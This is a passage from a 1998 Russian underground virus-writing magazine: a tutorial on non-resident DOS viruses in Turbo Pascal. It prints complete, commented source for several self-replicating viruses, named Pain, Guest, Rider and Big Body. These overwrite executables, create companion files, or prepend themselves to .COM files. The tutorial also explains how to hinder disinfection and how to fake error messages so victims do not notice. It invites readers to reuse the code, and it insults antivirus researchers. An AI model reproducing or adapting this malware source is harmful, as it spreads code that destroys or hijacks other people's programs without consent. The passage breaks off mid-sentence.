
      ▄▄                  █
     ▀▀▀  Virus Magazine  █ Box 176, Kiev 210, Ukraine      IV   1998
     ▀██ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ █ ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀ ▀ ▀▀▀▀▐▀▀▀  █▀▀▀▀▀▀▀█
      ▐█ █▀▄ █▀▀ ▄▀▀ ▄▀▀ ▄█▄ ▄▀▀ █▀█    ▌ █ ▄▀█ █ ▄▀▀ █▄▄   █ █ ▀▀█ █
       █ █ █ █▀  █▀  █    █  █▀  █ █    █ █ █ █ █ █   █     █ █ ▄▄█ █
       █ ▐ ▐ ▐   ▐▄▄ ▐▄▄  ▐  ▐▄▄ ▐▄▀     ▀█ ▀▄█ ▐ ▐▄▄ ▐▄▄▄  █ █ █▄▄ █
       ▐ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  █▄▄▄▄▄▄▄█
          (C) Copyright, 1994-98, by STEALTH group WorldWide, unLtd.

                          Нерезидентные вирусы


1. Вирусы, замещающие програмный код (Overwrite).

                       "Степь дышала огнем. Все, абсолютно все выгорело.
                        И не осталось ничего под палящим солнцем, что
                        могло бы дышать или двигаться."

                                           СкунсС, "Мишкомания"


        Как уже говорилось в части A, этот вид вирусов уже давно
мертв, и если и появляются еще вирусы данного вида, то только
на ассемблере и только как соревнование в написании самого маленького
overwrite-вируса. На данный момент самый маленький overwrite,
который мне известен, написан Reminder'ом (Death Virii Crew group)
и занимает 22 байта.
        Исходник overwrite-вируса, приводимый здесь, написан мной
специально для этого руководства и нигде более не распускался.

        Алгоритм работы overwrite-вируса следующий:

        1.  Открыть файл, из которого вирус получил управление.
        2.  Считать в буфер код вируса.
        3.  Закрыть файл.
        4.  По маске поискать подходящий для заражения файл.
        5.  Если файлов больше не найдено, перейти к пункту 10.
        6.  Открыть найденный файл.
        7.  Проверить, не заражен ли уже найденный файл этим вирусом.
        8.  Если заражен, перейти к пункту 10.
        9.  Записать в начало файла код вируса.
        10. Закрыть файл.
        { по желанию автора можно заразить от одного до всех файлов
          в каталоге или на диске }
        11. Выдать на экран какое-нибудь сообщение об ошибке, типа
            'Abnormal program termination' или 'Not enough memory',
            дабы юзер не слишком удивился тому, что прога не
            запустилась.
        12. Завершить программу.

{ Указания компилятору - 2048b стек, 0 heap, и вырубить всякие проверки
  типа правильность ввода/вывода, не вставлять в код debug info и пр,
  чтобы вирус в один прекрасный момент не вылетел в ДОС с надписью
  Run-time error XXX at XXXX:XXXX. Лучше уж пусть повиснет :) }

{$M 2048 , 0 , 0}
{$A-}
{$B-}
{$D-}
{$E+}
{$F-}
{$G-}
{$I-}
{$L-}
{$N-}
{$S-}
{$V-}
{$X+}

Uses Dos; { Использует модуль Dos и System (модуль System автоматически
            подключается к каждой программе при компиляции) }

 Const
     VirName   =  'Pain';                { имя вируса }
     VirLabel  : String[5] = 'Pain!';    { строка для проверки на повторное
                                           заражение, дописывается в зара-
                                           жаемый файл сразу после кода
                                           вируса }
     VirLen    =  4208;                  { длина получаемого при компиляции
                                           EXE-файла }
     Author    =  '(c) Dirty Nazi/SGWW. 4 PVT only!'; { Авторский копирайт }
     InfCount  =  2;                     { Количество заражений за один
                                           сеанс работы }

 Var
    VirIdentifier     :  Array [1..5] of Char; { массив для определения
                                                 наличия копии вируса в
                                                 найденом файле }
    VirBody           :  File;                 { файловая переменная для
                                                 работы с файлами }
    Target            :  File;                 { еще одна файловая пере-
                                                 менная, хотя без нее
                                                 можно было бы обойтись.
                                                 Но с ней, как мне кажется,
                                                 будет понятней }
    TargetFile        :  PathStr;              { для имени найденого файла }
    VirBuf            :  Array [1..VirLen] of Char; { буфер для тела вируса }
    Time              :  LongInt;              { для даты/времени файла }
    InfFiles          :  Byte;                 { счетчик кол-ва заражений }
    DirInfo           :  SearchRec;            { это подробно расписывалось
                                                 в части A }
    LabelBuf          :  Array [1..5] of Char; { а это то же, что и
                                                 VirIdentifier }

 procedure Init; { инициализация }
  begin

     LabelBuf[1]:=VirLabel[1];
     LabelBuf[2]:=VirLabel[2];
     LabelBuf[3]:=VirLabel[3];
     LabelBuf[4]:=VirLabel[4];
     LabelBuf[5]:=VirLabel[5];

     InfFiles:=0;  { обнуляем счетчик количества инфицированных }

     Assign(VirBody , ParamStr(0)); { связываем файловую переменную
                                      VirBody с именем программы,
                                      откуда мы стартовали }
     Reset(VirBody , 1);            { открываем файл с recsize = 1 байту }

     BlockRead(VirBody , VirBuf , VirLen); { считываем из файла тело вируса
                                             в массив VirBuf }

     Close(VirBody); { и закрываем файл }

 end;

 procedure FindTarget; { поиск жертв }

  Var
     Sr  :  SearchRec;

 function VirusPresent : Boolean; { функция возвращает True, если найден-
                                    ная программа уже заражена, и False,
                                    если нет }
  begin

     VirusPresent:=False;   { пока будем считать что вируса в ней нет }

     Assign(Target , TargetFile); { открывам найденный файл }
     Reset(Target , 1);

     Seek(Target , VirLen);       { перемещаемся на длину тела вируса
                                    от начала файла }
     BlockRead(Target , VirIdentifier , 5); { считываем 5 байт - если
                                              файл уже заражен, там
                                              находится наша метка }

     If VirIdentifier = VirLabel Then
      VirusPresent:=True;  { если метка есть, значит, и вирус есть }

  end;

 procedure InfectFile; { собсно процедура заражения }
  begin

   If Sr.Size < VirLen + 100 Then Exit; { если размерчик найденного
                                          файла меньше, чем длина вируса
                                          плюс 100 байт (хватило бы и 5,
                                          остальные 95 чтоб мало не
                                          казалось, то выходим из
                                          процедуры }

   If Not VirusPresent Then { Если найденая программа еще не заражена,
                              заразим ее }
    begin

       Time:=Sr.Time;   { запомним дату/время файла (атрибуты запоми-
                          нать не надо, так как мы ищем файлы
                          с атрибутом Archive, а этот атрибут уставли-
                          вается на файл после сохранения в любом
                          случае }

       Assign(Target , TargetFile); { открываем для заражения }
       Reset(Target , 1);

       BlockWrite(Target, VirBuf, VirLen); { записывам тело вируса в
                                             начало файла }

       Seek(Target , VirLen); { перемещаем указатель текущей позиции
                                на длину вируса от начала файла }

       BlockWrite(Target , LabelBuf , 5); { вписываем метку зараженности }

       SetFTime(Target , Time); { устанавливаем файлу дату/время евойные }

       Close(Target); { закрываем }

       Inc(InfFiles); { увеличиваем на один счетчик инфицированных }

    end;
 end;

  begin { начало процедуры FindTarget }

      FindFirst('*.EXE', Archive , Sr); { ищем в текущем каталоге файлы
                                          по маске *.EXE с атрибутами
                                          Archive }
       While DosError = 0 Do { пока есть файлы для заражения }
         begin

           If Sr.Name='' Then Exit;

           TargetFile:=Sr.Name; { запоминаем имя найденного файла в
                                  переменную TargetFile }

           InfectFile;          { вызываем процедуру заражения }

           If InfFiles > InfCount Then Exit; { если заразили InfCount
                                               файлов, завершаем поиск }

           FindNext(Sr);   { ищем следующий файл по маске }

         end;
  end;

 begin  { * MAIN BODY * }

     Init; { инициализируемся }

     FindTarget; { ищем жертвы и заражаем их }

     WriteLn('Abnormal program termination.'); { выдаем на экран
                                                 сообщение об ошибке }

       If 2 = 3 Then { это здесь затем, чтобы компилятор вставил в код
                       константы VirName и Author, условие же поставлено
                       таким образом, что эти строки никогда не будут
                       выведены на экран }
          begin
             WriteLn(VirName);
             WriteLn(Author);
          end;

        { программа завершена }
 end.

2. Вирусы-спутники (companion).

        Вирусы-спутники, написанные на ЯВУ, в данное время довольно распро-
странены - в VirList.WEB соотношение companion и parasitic вирусов примерно
один к двум.

2.1. Инфицирование методом создания .COM файла-спутника.

                        "- Я не хочу, чтобы Черч был похож на тех
                         мертвых домашних животных! - неожиданно с
                         яростью взорвалась Элли. - Я не хочу, чтобы
                         Черч умер! Он - мой кот! Он не кот Бога!
                         Пусть у Бога будет свой кот! Пусть у Бога
                         будут все проклятые, старые коты, если он
                         хочет, пусть убивает их! Черч - мой!"

                            Стивен Кинг, "Кладбище домашних животных"


        Говоря другими словами, мы не трогаем "чужого кота" - .EXE
программу. Мы создаем "своего кота" - .COM файл с именем .EXE программы.
И все довольны.
        Алгоритм работы такого вируса предельно прост - нет нужды хранить
в теле вируса длину откомпилированного .EXE файла с вирусным кодом, не
надо считывать в буфер тело вируса и не надо открывать файл, из которого
вирус получил управление. Не надо нигде хранить метку для определения,
заражен ли файл. Заражение производится с помощью командного
процессора:

        1. Если в командной строке указаны параметры, сохранить их
           в переменную типа String для передачи инфицированной
           программе.
        2. Найти .EXE файл-жертву.
        3. Проверить, не присутствует ли в каталоге с найденным
           .EXE файлом-жертвой .COM файл с таким же именем,
           как у файла-жертвы.
        4. Если такой .COM присутствует, значит, файл уже заражен,
           переходим к пункту 6.
        5. С помощью командного процессора скопировать файл, из
           которого мы получили управление, в файл с именем
           жертвы и расширением .COM.
        6. Процедурой Exec загрузить и выполнить файл с таким же
           именем, как и тот, с котрого мы стартовали, но с рас-
           ширением .EXE - т.е. выполнить инфицированную программу.
        7. Вернуть управление в ДОС.

        Вирус Guest, представленный на Ваше рассмотрение, также
написан специально для этого руководства и нигде не распускался.

{$M 2048 , 0 , 0}
{$A-}
{$B-}
{$D-}
{$E+}
{$F-}
{$G-}
{$I-}
{$L-}
{$N-}
{$S-}
{$V-}
{$X+}

Uses Dos;

 Const
     VirName   =  'Guest';               { имя вируса }
     Author    =  'Dirty Nazi/SGWW. 4 PVT only!'; { Авторский копирайт }
     InfCount  =  2;                     { Количество заражений за один
                                           сеанс работы }

 Var
    TargetFile        :  PathStr;              { для имени найденого файла }
    TargetCOM         :  PathStr;              { для создания нашей копии }
    InfFiles          :  Byte;                 { счетчик кол-ва заражений }
    DirInfo           :  SearchRec;            { это подробно расписывалось
                                                 в части A }
    Parms             :  String;               { для сохранения параметров
                                                 командной строки }
    I                 :  Byte;                 { для цикла For }

 procedure FindTarget; { поиск жертв }

  Var
     Sr  :  SearchRec;

 function VirusPresent : Boolean; { функция возвращает True, если найден-
                                    ная программа уже заражена, и False,
                                    если нет }
  Var
      Target : File;
  begin

     VirusPresent:=False;   { пока будем считать что вируса в ней нет }

     Assign(Target , TargetCOM); { пытаемся открыть файл с именем найденной
                                   программы, но с расширением .COM }
     Reset(Target , 1);
     If IOResult = 0 Then        { если не было ошибок при открытии,
                                   значит, программа уже инфицирована
                                   нами }
       begin
           VirusPresent:=True;
           Close(Target);        { открыл - так будь добр закрыть }
       end;

  end;

 procedure InfectFile; { собсно процедура заражения }
  begin

   If Not VirusPresent Then { Если найденая программа еще не заражена,
                              заразим ее }
    begin
    SwapVectors;
    Exec(GetEnv('COMSPEC'),'/C COPY /B '+ParamStr(0)+' '+TargetCOM+' >NUL');
    SwapVectors;
       { С помощью командного процессора копируем вирусный код в .COM-файл }
       Inc(InfFiles); { увеличиваем на один счетчик инфицированных }

    end;
 end;

  begin { начало процедуры FindTarget }

      FindFirst('*.EXE', Archive , Sr); { ищем в текущем каталоге файлы
                                          по маске *.EXE с атрибутами
                                          Archive }
       While DosError = 0 Do { пока есть файлы для заражения }
         begin

           If Sr.Name='' Then Exit;

           TargetFile:=Sr.Name; { запоминаем имя найденного файла в
                                  переменную TargetFile }
           TargetCOM:=Copy(TargetFile,1,Length(TargetFile) - 4) + '.COM';

           InfectFile;          { вызываем процедуру заражения }

           If InfFiles > InfCount Then Exit; { если заразили InfCount
                                               файлов, завершаем поиск }

           FindNext(Sr);   { ищем следующий файл по маске }

         end;
  end;

 begin  { * MAIN BODY * }

     Parms:=' ';
     If ParamCount <> 0 Then  { запоминаем параметры командной строки }
      For I:=1 To ParamCount Do
         Parms:=Parms + ' ' + ParamStr(I);

     FindTarget; { ищем жертвы и заражаем их }

     TargetFile:=Copy(ParamStr(0),1,Length(ParamStr(0))-4) + '.EXE';
     FindFirst(TargetFile , AnyFile , DirInfo); { ищем файл с именем
     файла, с которого мы стартовали, но с расширением .EXE }
     If DosError = 0 Then { если такой файл найден, то запускаем
     его на выполнение }
     begin
      SwapVectors;
       Exec(GetEnv('COMSPEC'),'/C '+TargetFile+Parms);
      SwapVectors;
     end Else { Если файла не найдено, значит так и будет }
       begin
             WriteLn(#13#10 , VirName, ' by ',Author);
             WriteLn('Данилов - в жопу ебаный мудак!');
       end;
        { программа завершена }
 end.

2.1.2. Инфицирование методом переименования .EXE файла-жертвы.

     Алгоритм работы вирусов этого подвида немногим отличается от
алгоритма вирусов подвида 2.1.1, но, на мой взгляд, является более
продвинутым - для излечения надо уже не просто удалить COM файл с
кодом вируса, а немного помучаться, разыскивая, во что же переимено-
ван EXE файл с инфицированной программой.

        1.  Если в командной строке указаны параметры, сохранить их
            в переменную типа String для передачи инфицированной
            программе.
        2.  Найти .EXE файл-жертву.
        3.  Проверить, не присутствует ли в каталоге с найденным
            .EXE файлом-жертвой файл с таким же именем, как у
            файла-жертвы, и с расширением, которое мы выбрали для
            инфицированной программы (например, OVL - програмный
            оверлей - см. описание вирусов этого типа в Части A).
        4.  Если такой файл присутствует, значит, программа уже
            инфицирована, переходим к пункту 7.
        5.  Переименовать найденный файл-жертву (.EXE) в файл с
            таким же именем, но с расширением, котрое мы выбрали
            для инфицированной программы (например .EXE в .OVL).
        6.  С помощью командного процессора скопировать файл, из
            которого мы получили управление, в файл с именем
            жертвы и расширением жертвы.
        7.  Найти в каталоге, из котрого мы получили управление,
            файл с именем, идентичным имени программы, с котрой
            мы стартовали, но с расширением, выбранным нами для
            инфицированной программы - это и будет инфицированная
            нами программа, которую в данный момент необходимо
            запустить на исполнение.
        8.  Если таковой файл не найден - что ж делать, переходим
            к пункту 12.
        9.  Изменить расширение найденного файла на .COM (ни в коем
            случае не на .EXE, ведь в .EXE файле с таким именем
            находится наш вирусный код!)
        10. Процедурой Exec загрузить и выполнить переименованный
            файл - т.е. выполнить инфицированную программу.
        11. Вернуть .COM файлу с инфицированной нами программой
            выбранное нами расширение, т.е. превратить его опять
            в неисполняемый.
        12. Вернуть управление в ДОС.

     Этот нерезидентный .EXE-вирус по моей классификации -- очень
неопасный, а по классификации Данилова даже и не знаю, ибо  вчера
в файле VirList.Web прочитал такую вещь:

ZzTop.340

     Опасный резидентный вирус. В конец  всех открываемых  *.C  и
*.CPP-файлов дописывает строку "ZZ TOP".

Я бы, например, просто удивился, найдя у себя в конце  *.C  файла
эту фразу, а вот Игорь Данилович считает это офигенной деструкци-
ей. Ну что ж, улыбок ему!

(For dummies only: *.C-файлы -- это исходники, писаные на языке C
то же самое, что файлы *.PAS, *.BAS, *.PRG, *.ASM etc.)

     О вирусе: вирус Rider ("Мандpiвник" по-нашему) написан очень
просто и доступно. Можете юзать исходник. За сеанс работы заража-
ет один *.EXE файл в текущем каталоге. *.COM - файлы не  заражает
не из-за невозможности этого, а из-за моей лени. Может, в  следу-
ющих версиях... Сам процесс заражения тоже весьма  прост:  жертва
переименовывается в файл с расширением .OVL (оверлей то бишь),  а
на его место с помощью командного  процессора копируется вирусный
код. При запуске производится заражение свеженайденного exeшника,
затем .OVL переименовывается в .EXE, а наш код в .OWL  и запуска-
ется на исполнение оригинал. Когда же оригинальчик отработал, со-
вершаем переименование в  обратном  порядке.  С  Read-Only  диска
программа не стартует, а выдаст преинтереснейшую надпись  о  том,
что программа не загрузится, ибо диск is write-protected. Вот та-
кой вот вирус написал Грязный Нацист. Have a nice die!

P.S. В представленном здесь виде вирус легко обезвредить, просто
     переименовав .OVL файл обратно в .EXE. Hо можно использовать
     простой прием, и чтобы запустить оригинальную программу,
     придется-таки запускать вирус. Вот этот прием:

XREF-TO: Часть D. Пункт 1. Защита от выкусывания тела вируса из
         программы.

 procedure MakeNot;
  Var
     Buf10 : Array [1..10] of Byte;
     Cicle : Byte;

  begin
       Seek(Prog , 0);
       Reset(Prog);
       BlockRead(Prog , Buf10 , 10);
       For Cicle:=1 To 10 Do Buf10[Cicle]:=Not Buf10[Cicle];
       Seek(Prog , 0);
       BlockWrite(Prog , Buf10 , 10);
       Close(Prog);
   end;

   При использовании этой процедуры надо учитывать, что заражаемая /
   запускаемая на исполнение программа должна быть связана с пере-
   менной Prog типа File, описанной в основном модуле. Суть процеду-
   ры состоит в том, что из заражаемой программы считывается 10 байт
   и кодируется операцией Not. .EXE программа становится неработо-
   способной. Только не забудьте запускать эту процедуру перед
   прогоном оригинала, а после прогона еще раз.


                                                  (cl) Dirty Nazi
{ Name          Rider  }
{ Version       1.0    }
{ Stealth       No     }
{ Tsr           No     }
{ Danger        0      }
{ Attac speed   Slow   }
{ Effects       No     }
{ Length        4000   }
{ Language      Pascal }
{ BodyStatus    Packed }
{ Packer        Pklite }

(*                     Copyleft (cl) Dirty Nazi                           *)
                           { For free use }


{$M 2048 , 0 , 0}  { Stack 1024b , Low Heap Limit 0b , High Heap Limit 0b }
Uses Dos;
 Const
     Fail   =  'Cannot execute '#13#10'Disk is write-protected';
     Ovr    =  '.OWL';
     Ovl    =  '.OVL';                   { Константы }
     Exe    =  '.EXE';
 Var
   DirInfo     :   SearchRec;
   Sr          :   SearchRec;
   Ch          :   Char;                 { Переменные }
   I           :   Byte;
   OurName     :   PathStr;
   OurProg     :   PathStr;
   Ren         :   File;
   CmdLine     :   ComStr;
   Victim      :   PathStr;
   VictimName  :   PathStr;

 procedure CheckRO;                      { Процедурка для проверки }
  begin                                  { диска на Read Only }

    Assign(Ren , #$FF);
    ReWrite(Ren);
    Erase(Ren);

    If IOResult <> 0 Then
      begin                              { Если диск Read Only, }
        WriteLn(Fail);                   { то мы вот так отвечаем }
        Halt(5);  { Access denied }
      end;

  end;  { end proc }

 procedure ExecReal;                     { Процедура прогонки оригинала }
  begin
     FindFirst(OurName + Ovl , AnyFile , DirInfo); { Находим оригинал }

      If DosError <> 0 Then            { Если не нашли }
       begin
     WriteLn('Virus RIDER. Let''s go on riding!');
     WriteLn('I beg your pardon, your infected file cannot be executed...');
     Halt(18);       { Выход с DosError = Файл не найден }
       end;

     Assign(Ren , OurName + Exe);       { Переименовываем нашу программу }
     ReName(Ren , OurName + Ovr);       { в .OWL }
     Assign(Ren , OurName + Ovl);       { а наш "оверлей" в .EXE }
     ReName(Ren , OurName + Exe);

     SwapVectors;                       { И запускаем его }
     Exec(GetEnv('COMSPEC') , '/C ' + OurName + Exe + CmdLine);
     SwapVectors;

     Assign(Ren , OurName + Exe);
     ReName(Ren , OurName + Ovl);       { А теперь возвращаем все на место }
     Assign(Ren , OurName + Ovr);
     ReName(Ren , OurName + Exe);

  end;  { end proc }

 procedure Infect;        { А это страшная процедура -- процедура заражения }
  begin

      Assign(Ren , Victim);
      ReName(Ren , VictimName + Ovl);     { Переименовываем жертву в .OVL }

   SwapVectors;            { Копируем наше тело на место жертвы }
   Exec(GetEnv('COMSPEC') , '/C COPY ' + OurProg + ' ' + Victim + ' >NUL');
   SwapVectors;
                                    { Вот и все }
  end;  { end proc }

 procedure FindFile;                    { Процедура поиска жертвы }
  begin

      FindFirst('*.EXE' , AnyFile , DirInfo);   { в текущем каталоге }
                                                { ищем .EXE файл }
       If DosError = 0 Then                     { и если мы его нашли }
         begin
             Victim:=DirInfo.Name;           { запоминаем имя жертвы }
             VictimName:=Copy(Victim , 1 , Length(Victim) - 4); { запоми- }
                                     { наем имя без расширения }
             FindFirst(VictimName + Ovl , AnyFile , Sr); { Ищем оверлей }
                                  { с тем же именем }

              If DosError <> 0 Then Infect; { И если оверлея нет, то }
                             { совершаем действия, классифицируемые }
                             { Лозинским как "подлые" }

         end;

  end; { end proc }

  procedure Init;                 { Процедура инициализации переменных }
   begin

        CmdLine:='';              { Коммандная строка }

        OurProg:=ParamStr(0);     { Полное имя нашей программы }
        OurName:=Copy(ParamStr(0) , 1 , Length(ParamStr(0)) - 4); { Имя }
                                        { нашей программы БЕЗ расширения }
        For I:=1 To ParamCount Do
          begin
              CmdLine:=ParamStr(I) + ' ';  { Запоминаем параметры }
          end;

   end;  { end proc }

 begin  { * MAIN * }

     If False Then     { А эту табличку мы засовываем в код для тех, кто }
         begin         { распакует наш вирус и начнет в нем копаться }
WriteLn(#13#10);
Write(#13#10' ╔═════════════════════════════════'+
            '═════════════════════════════════╗');
Write(#13#10' ║ This is DEMO version of RIDER. Register'+
            ' to get legalized version ║██ ');
Write(#13#10' ╠═══════════════════════════════════'+
            '═══════════════════════════════╣██ ');
Write(#13#10' ║ Mr. Lozinsky! I`m just a little child!+
            ' Please don`t kill me!     ║██ ');
Write(#13#10' ╚════════════════════════════════════'+
            '══════════════════════════════╝██ ');
Write(#13#10'   ███████████████████████████████████'+
            '█████████████████████████████████ '#13#10#13#10);
         end;

     Init;            { Инициализируемся }

     CheckRO;         { Проверка диска на R/O }

     FindFile;        { Ищем и заражаем }

     ExecReal;        { Загружаем наш "оверлей" }

 end.   { * Ну вот и все, и нам пора проститься * }


2.2. Вирусы, внедряющиеся в программу (parasitic).

        Этот вид является, с моей точки зрения, самым продвинутым,
ибо вирус внедряется в инфицируемую программу, и имеет много преимуществ
перед всеми вышеописанными методами: на диске не появляются лишние файлы,
никакой возни с копированием и переименованием, и усложняется лечение
инфицированных файлов.

2.2.1. Внедрение методом сдвига.

        Инфицируемая программа записывается в файл после кода вируса,
сдвигаясь на его длину, отсюда и название метода. Алгоритм работы вируса
подвида 2.2.1. следующий:

        1.  Открыть файл, с которого мы получили управление.
        2.  Считать в буфер тело вируса.
        3.  Закрыть файл.
        4.  Найти файл-жертву (для данного подвида лучше .COM, но
            можно и не слишком большой .EXE - это связано со считыванием
            ВСЕГО тела инфицируемой программы в память, которой может
            не хватить, если инфицируемая программа слишком большая).
        5.  Открыть файл-жертву.
        6.  Проверить файл на повторное заражение (у каждого эта
            процедура может быть своя, в основном используется метка,
            как в вирусе Pain (overwrite, представленный в этой части).
        7.  Если файл уже инфицирован, перейти к пункту 4.
        6.  Считать в буфер ВСЕ ТЕЛО программы.
        7.  Записать в начало файла тело вируса из буфера.
        8.  Дописать в файл после тела вируса тело программы из
            буфера. Длина программы увеличится на длину вируса.
        9.  Закрыть файл-жертву.
        10. Открыть файл, с которого мы стартовали.
        11. Считать в буфер тело инфицированной программы,
            расположенное в файле после тела вируса.
        12. Создать на диске временный файл с раширением
            .COM или .EXE (в зависимости от того, какой тип
            программ мы заражали).
        13. Записать в этот файл тело программы из буфера.
        14. Закрыть созданный файл.
        15. Процедурой Exec запустить созданный файл на исполнение -
            выполнится инфицированная программа.
        16. По завершению работы программы созданный файл удалить.
        17. Вернуть управление в ДОС.

(*########################################################################
   Приветствую всех почтенных программистов на языке Pascal
   Вирусы это хорошая возбудилка для ума,но все думают,что написать вирус
   на 'высоком' языке весьма трудно.Так вот,знайте,что это НЕПРАВДА!
   Писать на Паскале весьма легко,правда величина результирующего кода
   вызывает благоговейный трепет в сердцах.:-)
   Но,что поделать,приходится этот самый код сжимать какой-либо Pklite

XREF-TO: Часть D. Пункт 4. Как уменьшить размер откомпилированного вируса.

   и учитывать сие обстоятельство при повторной компиляции.
   Когда вы гляните вниз,то увидите откоментированный исходник
   нерезидентного вируса заражающего .COM файлы.
   Сам исходный текст был передан мне одним знакомым моего знакомого,
   а я уже дополнил и откомментировал его,чтобы все желающие могли
   написать что-либо интересненькое хотя бы по мотивам сего произведения.
---------------------------------------------------------------------------
   В конец своего бредисловия выражаю великую благодарность тов. М-му
   за его (можно сказать невольный) полигон вирусов.
---------------------------------------------------------------------------
1.После заражения файл станет .EXE программой.
  Сие происходит оттого,что вирус после компиляции являлся .EXE файлом
  а при заражении просто прилепил к себе бедный зараженный .COM файл.
  Соответственно первые байты файла стали 'MZ',что говорит системе
  об экзешности файла.
2.Всякие программы реагирующие на изменение своей длины НЕ БУДУТ вопеть
  о гнусных изменениях файла т.к. он запускается вирусом в 'очищеной' форме.
3.Лечить зараженные программы можно тупо в текстовом редакторе --
  просто делая DEL для первых vir_len байтов.
  Но вирусатор может сделать vir_len:=vir_len+rnd(100),а оригинальную длину
  запоминать где-либо в теле вируса ;-).
4.И еще,запомните - программа зараженная ЭТИМ вирусом с защищенной от записи
  дискеты НИКОГДА не стартует!
########################################################################

Я буду весьма рад,если после прочтения сих строк - этот файл станет доступным
для всех ваших друзей и знакомых.
На авторские права я не претендую - так,что делайте с этим вирусом чего
хотите но знайте,что вставляя в него строки могущие причинить вред чужой
работе -- вы оскорбляете этого самого чужого человека.

        (w) Light General 08.10.94
#########################################################################*)


{$m 9000,0,250000}
uses dos;
label _1,_2;
const vir_len:word =4859;         (* Длина запоколоченного вируса *)
const max_len:word =(65535-4859); (* Макс. длина заражаемого файла *)
var       f,f1      :file;
          p,p1,p2   :pointer;
          sr        :searchrec;
          l,l1      :word;
          b         :char;

begin
     assign(f,paramstr(0));   (* Берем имя файла откудова мы загрузились *)
     reset(f,1);              (* Open this candy *)
     getmem(p,vir_len);
     blockread(f,p^,vir_len); (* Читаем начало сего файла (т.е. тело нашего
                                 запоколоченого вируса *)
     seek(f,vir_len);
     l1:=filesize(f)-vir_len; (* l1:='незараженная' длина файла *)
     getmem(p1,l1);
     blockread(f,p1^,l1);     (* Читаем с того места где начинается сама
                                 оригинальная программа (т.к. весь процесс
                                 заражения состоит в отодвигании программы
                                 в файле на vir_len байт и записи в это место
                                 тела вируса.Т.е. теперь вирус будет иметь
                                 управление первым.*)
     assign(f1,'Light.com');  (* Создадим на диске левый файл *)
     rewrite(f1,1);
     blockwrite(f1,p1^,l1); (* Запишем в него только что считаную программу *)
     freemem(p1,l1);
     close(f);
     close(f1);
     if paramstr(1)='10' then (* Коли в командной строке была печетана цифра
                                 10 то выведем информацию о вирусе *)
     begin
      writeln('VIRUS INFO.');
      writeln('Name : Big Body.');
      writeln('Model : C-',vir_len);
      writeln('Danger : 0');
      writeln('Stealth factor : -2');
      writeln('Language : Turbo Pascal 5.5');
      writeln('Creator & K : (c) Andrew .Modifity from Light General.');
      writeln;
     end;
     swapvectors;
     exec('Light.com',paramstr(1)); (* Запустим чистый файл на выполнение *)
(* Теперь когда файл отработал - мы получаем управление!!! *)
     swapvectors;
     erase(f1);
     findfirst('*.com',archive,sr); (* Поищем чего бы заразить *)
_1:
     if (doserror = 0) and (sr.size<max_len) and (sr.name <>'COMMAND.COM')
 then begin
     assign(f,sr.name); (* Откроем найденный файл *)
     reset(f,1);
     blockread(f,b,1);  (* Считаем первый байт *)
     if  b='M' then  goto _2; (* Если файл уже заражен то поищем другой *)
     seek(f,0);
     l:=filesize(f);
     getmem(p2,l);      (* Выделим память и считаем в нее найденый файл *)
     blockread(f,p2^,l);
     rewrite(f,1);
        (* А теперь перепишем энтот файл по новому *)
     blockwrite(f,p^,vir_len);  (* Сперва свое тело *)
     blockwrite(f,p2^,l);       (* А за ним оригинальную программу *)
_2:
     close(f);
      findnext(sr);     (* Будем искать пока файлы не закончатся *)
      goto _1;
     dispose(p);   (* Если файлы кончились то уберем за собой и выйдем *)
     dispose(p2);
     end
else
writeln('Мужики бросай работать - пошли пивасика пить!');
writeln('(И М********го с собой берите шоб он питание не вырубал.)');
end.


2.2.2. Внедрение способом переноса.

        Вирусы данного подвида размножаются следующим образом: из
инфицируемой программы считывается часть кода от начала файла, по длине
равная длине вируса, вирус вписывается на место считанного кода, а
оригинальное начало программы переносится в конец файла (можно также
в середину файла, например, а середину - в конец, дабы более запутать).
Отсюда и название метода - "метод переноса". Превосходство данного
метода над всеми вышеописанными в том, что инфицированная программа
исполняется в том же виде, в каком она была до заражения, и из файла
с тем же именем и расширением, то есть программы, проверяющие себя
на предмет заражения вирусом не вопят, и корректно исполняются
все программы, ищущие свои файлы конфигурации по алгоритму

                  ИМЯ_И_ПУТЬ_К_САМОЙ_ПРОГРАММЕ + .INI

        Недостаток сего метода в том, что если при исполнении инфицированной
программы повиснет компьютер или произойдет перезагрузка системы, инфи-
цированная программа окажется "чистой", то бишь без вируса. Но, во-первых
"кто не рискует, тот не пьет шампанское", а во-вторых, на 30-40 программ
обычно виснет только одна (ни в коем случае не по вине вируса!!!), ну и
хер с ней.
        Алгоритм работы такого вируса следующий:

        1.  Открыть файл, с которого мы получили управление.
        2.  Считать в буфер тело вируса.
        3.  Закрыть файл.
        4.  Найти файл-жертву.
        5.  Открыть файл-жертву.
        6.  Проверить файл на повторное заражение (у каждого эта
            процедура может быть своя, в основном используется метка,
            как в вирусе Pain (overwrite, представленный в этой части).
        7.  Если файл уже инфицирован, перейти к пункту 4.
        6.  Считать в буфер из начала найденного файла кусок программы,
            по длине равный длине тела вируса.
        7.  Записать в начало файла тело вируса из буфера.
        8.  Дописать в конец файла считанное начало программы из
            буфера. Длина программы увеличится на длину вируса.
        9.  Закрыть файл-жертву.
        10. Открыть файл, с которого мы стартовали.
        11. Считать в буфер начало инфицированной программы,
            расположенное в конце файла.
        12. Записать считанное начало программы поверх кода
            вируса в начало файла.
        13. Усечь файл до его оригинальной длины (то бишь удалить
            кусок кода с конца файла, по длине равный длине тела
            вируса).
        14. Закрыть файл.
        15. Процедурой Exec запустить файл, с которого мы стартовали,
            (ParamStr(0)) на исполнение - выполнится инфицированная
            программа.
        16. По завершению работы программы опять открыть файл, с
            которого мы стартовали.
        17. Вписать в начало файла тело вируса, а оригинальное начало
            программы опять вписать в конец файла.
        18. Закрыть файл.
        17. Вернуть управление в ДОС.

<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

     Заражает все  .COM.EXE файлы на текущем диске, записывается в на-
чало, оригинальное начало переносит в конец файла.  В  DOS'е  работает
корректно, в Форточках не тестировал. При заражении  циклически  обхо-
дит текущий диск начиная с корневого каталога. После заражения 2х фай-
лов отдает управление носителю. Не заражает файлы меньше VirLength (а-
то лажа получится при работе: мусор в буфере,  программа  в  нокдауне,
юзер в панике etc.) и .COM файлы Length <  20000  (ибо  сильно заметно
